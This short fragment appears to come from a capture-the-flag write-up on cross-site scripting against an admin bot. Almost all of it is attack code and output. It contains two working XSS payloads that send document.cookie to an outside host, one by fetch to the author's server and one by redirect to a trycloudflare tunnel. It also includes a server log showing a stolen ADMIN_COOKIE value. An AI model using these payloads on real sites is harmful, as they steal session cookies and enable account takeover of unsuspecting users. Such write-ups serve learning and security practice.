This payload fetch a request to my server with the bot cookie:
```js
<script>fetch('https://my-server.com/?c='+encodeURIComponent(document.cookie));</script>
```
After sometime, my server got the request:
```
.
.
.
127.0.0.1 - - [24/Feb/2025 23:03:21] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2025 23:03:23] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2025 23:03:23] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2025 23:04:52] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2025 23:04:52] "GET /?c=ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6 HTTP/1.1" 200 -
```

<script>document.location='https://me-searching-newsletters-provision.trycloudflare.com?c='+document.cookie</script>

